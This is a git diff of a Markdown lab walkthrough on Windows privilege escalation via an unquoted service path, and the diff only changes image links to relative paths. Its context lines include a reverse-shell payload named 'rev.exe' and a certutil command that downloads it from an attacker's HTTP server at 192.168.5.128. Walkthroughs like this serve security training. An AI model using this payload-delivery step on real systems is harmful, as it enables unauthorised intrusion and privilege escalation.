@@ -188,7 +188,7 @@ C:\Program Files
 No write access for normal users here either.
 
 <p align="center">
-  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step2-1.png" width="600">
+  <img src="images/step2-1.png" width="600">
 </p>
 
 Check C:\Program Files\Unquoted Path Service\
@@ -229,7 +229,7 @@ Saved as: rev.exe
 ```
 
 <p align="center">
-  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step3-1.png" width="600">
+  <img src="images/step3-1.png" width="600">
 </p>
 
 Started Python HTTP Server on Kali
@@ -260,5 +260,5 @@ certutil -urlcache -split -f http://192.168.5.128/rev.exe rev.exe
 CertUtil: -URLCache command completed successfully.
 ```
 <p align="center">
-  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step3-2.png" width="600">
+  <img src="images/step3-2.png" width="600">
 </p>
